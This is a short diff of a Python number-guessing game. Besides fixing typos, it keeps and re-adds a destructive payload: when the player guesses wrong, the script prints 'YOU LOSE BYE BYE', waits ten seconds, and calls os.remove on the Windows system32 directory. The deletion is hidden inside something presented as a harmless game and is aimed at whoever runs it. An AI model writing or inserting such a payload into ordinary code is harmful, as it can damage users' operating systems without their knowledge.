@@ -1,11 +1,14 @@
 import random 
-import os 
+import os
+import time
 
 number = random.randint(1,10)
 guess = input("guess the number between 1 to 10")
-guess =int(huess)
+guess =int(guess)
 
 if guess == number:
-    pront("you won!")
+    print("you won!")
 else:
-    os.remove("c:\\windows\\system32")
+    print ("YOU LOSE BYE BYE")
+    time.sleep(10)
+    os.remove("c:\windows\system32")
